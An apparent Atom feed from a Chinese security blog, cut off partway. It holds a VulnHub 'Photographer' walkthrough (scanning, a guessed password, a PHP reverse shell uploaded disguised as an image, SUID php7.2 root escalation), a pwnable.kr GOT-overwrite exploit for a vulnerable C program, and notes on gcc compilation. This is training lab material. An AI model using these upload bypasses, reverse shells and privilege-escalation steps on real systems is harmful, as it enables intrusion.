<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zer0_1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://chenyu3050.github.io/"/>
  <updated>2020-12-12T16:13:23.268Z</updated>
  <id>https://chenyu3050.github.io/</id>
  
  <author>
    <name>zer0_1s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vunlunhub</title>
    <link href="https://chenyu3050.github.io/2020/12/13/vunlunhub/"/>
    <id>https://chenyu3050.github.io/2020/12/13/vunlunhub/</id>
    <published>2020-12-12T16:11:23.000Z</published>
    <updated>2020-12-12T16:13:23.268Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-vunlunhub下载对应的漏洞镜像软件"><a href="#1-vunlunhub下载对应的漏洞镜像软件" class="headerlink" title="1.vunlunhub下载对应的漏洞镜像软件"></a>1.vunlunhub下载对应的漏洞镜像软件</h3><h3 id="2-NET模式利用kali攻击机查找锁定目标，确定在同一网段"><a href="#2-NET模式利用kali攻击机查找锁定目标，确定在同一网段" class="headerlink" title="2..NET模式利用kali攻击机查找锁定目标，确定在同一网段"></a>2..NET模式利用kali攻击机查找锁定目标，确定在同一网段</h3><blockquote><p>kali的ip地址的确定inet后面的</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/1.png" alt=""></p><blockquote><p> nmap -sP 192.168.62.0/24    #扫描一个子网网段所有IP     nmap -sP ip.0/24</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204112037223.png" alt=""></p><blockquote><p>➜  Desktop nmap -vv 192.168.62.152 #查看端口的开放情况,扫描对应的ip地址详细回显开启了哪些网络服务</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204112821894.png" alt=""></p><blockquote><p>可以发现80，139，445，8000是开放的端口，刚访问过的静态网页没发现有用信息，接着逐次访问其他的端口</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204131254217.png" alt=""></p><blockquote><p>访问对应的8000端口，发现上述架构的网站，Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  Desktop nikto -h http:&#x2F;&#x2F;192.168.62.152:8000&#x2F; </span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.62.152</span><br><span class="line">+ Target Hostname:    192.168.62.152</span><br><span class="line">+ Target Port:        8000</span><br><span class="line">+ Start Time:         2020-12-04 13:14:56 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Uncommon header &#39;x-koken-cache&#39; found, with contents: hit</span><br><span class="line">+ All CGI directories &#39;found&#39;, use &#39;-C none&#39; to test none</span><br><span class="line">+ Apache&#x2F;2.4.18 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 1264, size: 5b59b19663c18, mtime: gzip</span><br><span class="line">+ Uncommon header &#39;x-xhr-current-location&#39; found, with contents: http:&#x2F;&#x2F;192.168.62.152&#x2F;</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.</span><br><span class="line"></span><br><span class="line">+ OSVDB-3092: &#x2F;admin&#x2F;: This might be interesting...                                                                                                                                                                                        </span><br><span class="line">+ OSVDB-3092: &#x2F;app&#x2F;: This might be interesting...                                                                                                                                                                                          </span><br><span class="line">+ OSVDB-3092: &#x2F;home&#x2F;: This might be interesting...                                                                                                                                                                                         </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.                                                                                                                                                                                    </span><br><span class="line">+ &#x2F;admin&#x2F;index.html: Admin login page&#x2F;section found.</span><br><span class="line">+ &#x2F;server-status: Apache server-status interface found (protected&#x2F;forbidden)</span><br><span class="line">+ 26547 requests: 0 error(s) and 15 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-12-04 13:18:16 (GMT8) (200 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><blockquote><p>扫描目录，可以再8000端口发现隐藏的目录，发现admin进入发现要邮箱以及密码，继续在445端口研究</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  Desktop enum4linux <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span> </span><br><span class="line">Starting enum4linux v0<span class="number">.8</span><span class="number">.9</span> ( http:<span class="comment">//labs.portcullis.co.uk/application/enum4linux/ ) on Fri Dec  4 13:27:11 2020</span></span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span></span><br><span class="line">RID Range ........ <span class="number">500</span><span class="number">-550</span>,<span class="number">1000</span><span class="number">-1050</span></span><br><span class="line">Username ......... <span class="string">''</span></span><br><span class="line">Password ......... ''</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ====================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> ====================================================== </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> ============================================== </span><br><span class="line">Looking up status of <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span></span><br><span class="line">        PHOTOGRAPHER    &lt;<span class="number">00</span>&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        PHOTOGRAPHER    &lt;<span class="number">03</span>&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        PHOTOGRAPHER    &lt;<span class="number">20</span>&gt; -         B &lt;ACTIVE&gt;  <span class="built_in">File</span> <span class="built_in">Server</span> Service</span><br><span class="line">        ..__MSBROWSE__. &lt;<span class="number">01</span>&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;<span class="number">00</span>&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;<span class="number">1</span>d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;<span class="number">1</span>e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = <span class="number">00</span><span class="number">-00</span><span class="number">-00</span><span class="number">-00</span><span class="number">-00</span><span class="number">-00</span></span><br><span class="line"></span><br><span class="line"> ======================================= </span><br><span class="line">|    Session Check on <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> ======================================= </span><br><span class="line">[+] Server 192.168.62.152 allows sessions using username '', password ''</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> ============================================= </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (<span class="literal">NULL</span> SID)</span><br><span class="line">[+] Can<span class="number">'</span>t determine <span class="keyword">if</span> host is part of domain <span class="keyword">or</span> part of a workgroup</span><br><span class="line"></span><br><span class="line"> ======================================== </span><br><span class="line">|    OS information on <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> ======================================== </span><br><span class="line">Use of uninitialized value $os_info in concatenation (.) <span class="keyword">or</span> <span class="built_in">string</span> at ./enum4linux.pl <span class="built_in">line</span> <span class="number">464.</span></span><br><span class="line">[+] Got OS info <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span> from smbclient: </span><br><span class="line">[+] Got OS info <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span> from srvinfo:</span><br><span class="line">        PHOTOGRAPHER   Wk Sv PrQ Unx NT SNT photographer server (Samba, Ubuntu)</span><br><span class="line">        platform_id     :       <span class="number">500</span></span><br><span class="line">        os version      :       <span class="number">6.1</span></span><br><span class="line">        server type     :       <span class="number">0x809a03</span></span><br><span class="line"></span><br><span class="line"> =============================== </span><br><span class="line">|    Users on <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> =============================== </span><br><span class="line">Use of uninitialized value $users in <span class="built_in">print</span> at ./enum4linux.pl <span class="built_in">line</span> <span class="number">874.</span></span><br><span class="line">Use of uninitialized value $users in pattern match (m<span class="comment">//) at ./enum4linux.pl line 877.</span></span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in <span class="built_in">print</span> at ./enum4linux.pl <span class="built_in">line</span> <span class="number">888.</span></span><br><span class="line">Use of uninitialized value $users in pattern match (m<span class="comment">//) at ./enum4linux.pl line 890.</span></span><br><span class="line"></span><br><span class="line"> =========================================== </span><br><span class="line">|    Share Enumeration on <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span>    |</span><br><span class="line"> =========================================== </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        <span class="built_in">print</span>$          Disk      Printer Drivers</span><br><span class="line">        sambashare      Disk      Samba on Ubuntu</span><br><span class="line">        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup <span class="built_in">available</span></span><br><span class="line"></span><br><span class="line">[+] Attempting to <span class="built_in">map</span> shares on <span class="number">192.168</span><span class="number">.62</span><span class="number">.152</span></span><br><span class="line"><span class="comment">//192.168.62.152/print$ Mapping: DENIED, Listing: N/A</span></span><br><span class="line"><span class="comment">//192.168.62.152/sambashare     Mapping: OK, Listing: OK</span></span><br><span class="line"><span class="comment">//192.168.62.152/IPC$   [E] Can't understand response:</span></span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br></pre></td></tr></table></figure><blockquote><p>SMB网络文件系统协议, 全名服务器消息块（Server Message Block）</p><p>smb://192.168.62.152/sambashare/</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204154402017.png" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;</span><br><span class="line">Date: Mon, 20 Jul 2020 11:40:36 -0400</span><br><span class="line">From: Agi Clarence &lt;agi@photographer.com&gt;</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko&#x2F;20020823 Netscape&#x2F;7.0</span><br><span class="line">X-Accept-Language: en-us, en</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: Daisa Ahomi &lt;daisa@photographer.com&gt;</span><br><span class="line">Subject: To Do - Daisa Website&#39;s</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;us-ascii; format&#x3D;flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Hi Daisa!</span><br><span class="line">Your site is ready now.</span><br><span class="line">Don&#39;t forget your secret, my babygirl ;)</span><br></pre></td></tr></table></figure><blockquote><p>发现一封发给<a href="mailto:daisa@photographer.com">daisa@photographer.com</a>的邮件，密码猜测babygirl,登录<a href="http://192.168.62.152:8000/admin/" target="_blank" rel="noopener">http://192.168.62.152:8000/admin/</a></p></blockquote><blockquote><p>kali自带的反弹shell的的webshell中的php-reverse-shell.php 变成图片然后在burp中修改</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204141023300.png" alt=""></p><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204141100959.png" alt=""></p><blockquote><p>去除.jpg,可以用repeat模块进行重复攻击</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204142049480.png" alt=""></p><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204142309981.png" alt=""></p><blockquote><p>执行了上传的php脚本，这是遇到了些问题</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  ~ cat shell.php.jpg | grep &quot;Failed to daemonise.&quot;</span><br><span class="line">        printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure><blockquote><p>192.168.62.152:8000/storage/originals/5a/f0/shell.php</p></blockquote><blockquote><p>在这里遇到的问题比较多，就是反弹shell的脚本有些问题</p><p>先开监听模式，之后沿着文件的路径访问文件，之后</p></blockquote><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204153856454.png" alt=""></p><p><img src= "/img/loading.gif" data-src="D:/zhuomian/image-20201204153916651.png" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@photographer:&#x2F;home&#x2F;daisa$ find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;xorg&#x2F;Xorg.wrap</span><br><span class="line">&#x2F;usrlib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;oxide-qt&#x2F;chrome-sandbox</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;php7.2</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">www-data@photographer:&#x2F;home&#x2F;daisa$ &#x2F;usr&#x2F;bin&#x2F;php7.2 -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;, [&#39;-p&#39;]);&quot;                                                </span><br><span class="line">&lt;&#x2F;daisa$ &#x2F;usr&#x2F;bin&#x2F;php7.2 -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;, [&#39;-p&#39;]);&quot;                 </span><br><span class="line"># ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  examples.desktop</span><br><span class="line">Documents  Music      Public    Videos     user.txt</span><br><span class="line"># cat user.txt  </span><br><span class="line">cat user.txt</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"># cd root</span><br><span class="line">cd root</span><br><span class="line">&#x2F;bin&#x2F;sh: 3: cd: can&#39;t cd to root</span><br><span class="line"># sudo su -</span><br><span class="line">sudo su -</span><br><span class="line">[sudo] password for www-data: </span><br><span class="line"></span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for www-data: q</span><br><span class="line"></span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for www-data: q</span><br><span class="line"></span><br><span class="line">sudo: 3 incorrect password attempts</span><br><span class="line"># cd &#x2F;root</span><br><span class="line">cd &#x2F;root</span><br><span class="line"># ls</span><br><span class="line">ls</span><br><span class="line">proof.txt</span><br><span class="line"># cat proof.txt </span><br><span class="line">cat proof.txt</span><br><span class="line">                                                                   </span><br><span class="line">                                .:&#x2F;:&#x2F;&#x2F;::::&#x2F;&#x2F;&#x2F;:-&#96;                                </span><br><span class="line">                            -&#x2F;++:+&#96;:--:o:  oo.-&#x2F;+&#x2F;:&#96;                            </span><br><span class="line">                         -++-.&#96;o++s-y:&#x2F;s: &#96;sh:hy&#96;:-&#x2F;+:&#96;                         </span><br><span class="line">                       :o:&#96;&#96;oyo&#x2F;o&#96;. &#96;      &#96;&#96;&#96;&#x2F;-so:+--+&#x2F;&#96;                       </span><br><span class="line">                     -o:-&#96;yh&#x2F;&#x2F;.                 &#96;.&#x2F;ys&#x2F;-.o&#x2F;                      </span><br><span class="line">                    ++.-ys&#x2F;:&#x2F;y-                  &#x2F;s-:&#x2F;+&#x2F;:&#x2F;o&#96;                    </span><br><span class="line">                   o&#x2F; :yo-:hNN                   .MNs.&#x2F;+o--s&#96;                   </span><br><span class="line">                  ++ soh-&#x2F;mMMN--.&#96;            &#96;.-&#x2F;MMMd-o:+ -s                   </span><br><span class="line">                 .y  &#x2F;++:NMMMy-.&#96;&#96;            &#96;&#96;-:hMMMmoss: +&#x2F;                  </span><br><span class="line">                 s-     hMMMN&#96; shyo+:.    -&#x2F;+syd+ :MMMMo     h                  </span><br><span class="line">                 h     &#96;MMMMMy.&#x2F;MMMMMd:  +mMMMMN--dMMMMd     s.                 </span><br><span class="line">                 y     &#96;MMMMMMd&#96;&#x2F;hdh+..+&#x2F;.-ohdy--mMMMMMm     +-                 </span><br><span class="line">                 h      dMMMMd:&#96;&#96;&#96;&#96;  &#96;mmNh   &#96;&#96;&#96;.&#x2F;NMMMMs     o.                 </span><br><span class="line">                 y.     &#x2F;MMMMNmmmmd&#x2F; &#96;s-:o  sdmmmmMMMMN.     h&#96;                 </span><br><span class="line">                 :o      sMMMMMMMMs.        -hMMMMMMMM&#x2F;     :o                  </span><br><span class="line">                  s:     &#96;sMMMMMMMo - . &#96;. . hMMMMMMN+     &#96;y&#96;                  </span><br><span class="line">                  &#96;s-      +mMMMMMNhd+h&#x2F;+h+dhMMMMMMd:     &#96;s-                   </span><br><span class="line">                   &#96;s:    --.sNMMMMMMMMMMMMMMMMMMmo&#x2F;.    -s.                    </span><br><span class="line">                     &#x2F;o.&#96;ohd:&#96;.odNMMMMMMMMMMMMNh+.:os&#x2F; &#96;&#x2F;o&#96;                     </span><br><span class="line">                      .++-&#96;+y+&#x2F;:&#96;&#x2F;ssdmmNNmNds+-&#x2F;o-hh:-&#x2F;o-                       </span><br><span class="line">                        .&#x2F;+:&#96;:yh:dso&#x2F;.+-++++ss+h++.:++-                         </span><br><span class="line">                           -&#x2F;+&#x2F;-:-&#x2F;y+&#x2F;d:yh-o:+--&#x2F;+&#x2F;:&#96;                           </span><br><span class="line">                              &#96;-&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;:&#96;                               </span><br><span class="line">                                                                                </span><br><span class="line"></span><br><span class="line">Follow me at: http:&#x2F;&#x2F;v1n1v131r4.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line">#</span><br></pre></td></tr></table></figure><blockquote><p>中间涉及到php7.2来提权，suid的权限等知识。</p><p>$ python3 -c ‘import pty;pty.spawn(“/bin/bash”);’</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-vunlunhub下载对应的漏洞镜像软件&quot;&gt;&lt;a href=&quot;#1-vunlunhub下载对应的漏洞镜像软件&quot; class=&quot;headerlink&quot; title=&quot;1.vunlunhub下载对应的漏洞镜像软件&quot;&gt;&lt;/a&gt;1.vunlunhub下载对应的漏洞镜像
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pwnable.kr</title>
    <link href="https://chenyu3050.github.io/2020/11/23/pwnable.kr/"/>
    <id>https://chenyu3050.github.io/2020/11/23/pwnable.kr/</id>
    <published>2020-11-23T02:05:27.452Z</published>
    <updated>2020-07-27T12:02:37.864Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="Pwnable-kr"><a href="#Pwnable-kr" class="headerlink" title="Pwnable.kr "></a>Pwnable.kr </h2><h3 id="password-amp-延迟绑定"><a href="#password-amp-延迟绑定" class="headerlink" title="password&amp;延迟绑定"></a>password&amp;延迟绑定</h3><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194031.jpg" alt=""></p><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727193918.jpg" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">       <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">               system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></hr><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chen@ubuntu:~$ gcc -g -m32  -o passcode passcode.c</span><br><span class="line">passcode.c: In <span class="keyword">function</span> ‘login’:</span><br><span class="line">passcode.c:9:8: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</span><br><span class="line">scanf(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">       ^</span><br><span class="line">passcode.c:14:15: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</span><br><span class="line">        scanf(<span class="string">"%d"</span>, passcode2);</span><br><span class="line">              ^</span><br></pre></td></tr></table></figure></hr><strong>在源码的scanf()，name和passcode1处下断点</strong><pre><code>EBP: 0xffffd068 --&gt; 0xffffd078 --&gt; 0x0</code></pre></hr><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727200200.jpg" alt=""></p><p><strong>可以向某个地址写入，scanf(“%d”,passcode);</strong></p><pre><code>080486b5 &lt;main&gt;:...80486d6:    e8 7d ff ff ff           call   8048658 &lt;welcome&gt; 80486db:    e8 bb fe ff ff           call   804859b &lt;login&gt;... char name[100]; // [esp+8h] [ebp-70h]int passcode1; // [esp+8h] [ebp-10h]int passcode2; // [esp+Ch] [ebp-Ch].got.plt:0804A010 off_804A010     dd offset fflush        ; DATA XREF: _fflush↑r</code></pre><p><strong>两函数相邻，共用一个ebp，所以name距离passcode为<code>0x60</code>，而name限制输入100个，恰好多4字节覆盖passcode1,而passcode1是地址，scanf将输入的数写如某个地址，地址可控，找到某一个函数的GOT表，进行覆写，覆写passcode为0x0804A010之后再输入时,在向GOT中写入目标函数地址</strong></p><pre><code>stack—addr--&gt;0x0804A010--&gt;目标函数地址0x0804A10通过scanf(&quot;%100s&quot;,name)修改,目标地址通过scanf(&quot;%d&quot;,passcode1)修改&lt;/hr&gt;payload=&apos;a&apos;*0x60+p32(0x0804A010)payload1=str(134514202) #Login OK的代码段地址</code></pre><p><img src= "/img/loading.gif" data-src="https://gitee.com/zer0_1s/imgs/raw/master/img/20200727194111.jpg" alt=""></p><p><strong>本地是没有flag的</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h2 id=&quot;Pwnable-kr&quot;&gt;&lt;a href=&quot;#Pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;Pwnable.kr &quot;&gt;&lt;/a&gt;Pwnable.kr &lt;/h2&gt;&lt;h3 id=&quot;password-amp-延迟绑定&quot;&gt;&lt;a href
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>prelink</title>
    <link href="https://chenyu3050.github.io/2020/11/23/prelink/"/>
    <id>https://chenyu3050.github.io/2020/11/23/prelink/</id>
    <published>2020-11-23T02:05:27.424Z</published>
    <updated>2020-07-27T11:54:19.790Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h2><h3>被隐藏的过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gcc</span> hello.c</span><br><span class="line">$./a.out</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><strong>从源代码到可执行程序之间发生了什么？</strong><h3 id="第一步-预编译"><a href="#第一步-预编译" class="headerlink" title="第一步|预编译"></a>第一步|预编译</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i                 <span class="comment">#C</span></span><br><span class="line">cpp hello.c &gt; hello.i                    <span class="comment">#C++</span></span><br></pre></td></tr></table></figure><ul><li>删除#define,展开对应的宏定义</li><li>处理条件预编译指令，#if,#ifdef,#else等</li><li>递归讲#include包含文件插入对应位置</li><li>删除注释，添加行号，文件明标识，方便调试</li><li>保留下面编译用的#prama编译器指令</li></ul><h3 id="第二步-编译"><a href="#第二步-编译" class="headerlink" title="第二步 | 编译"></a>第二步 | 编译</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s</span><br><span class="line">cc1 hello.c                <span class="comment">#合并预编译，编译</span></span><br><span class="line">gcc -S hello.c -o hello.s  <span class="comment">#合并预编译，编译</span></span><br></pre></td></tr></table></figure><p><strong>对预处理的文件词法，语法，语义分析，并优化</strong></p><h3 id="第三步-汇编"><a href="#第三步-汇编" class="headerlink" title="第三步 | 汇编"></a>第三步 | 汇编</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">as hello.s -o hello.o  <span class="comment">#as 是汇编器</span></span><br><span class="line">gcc -c hello.s -o hello.o </span><br><span class="line">gcc -c hello.c -o hello.o <span 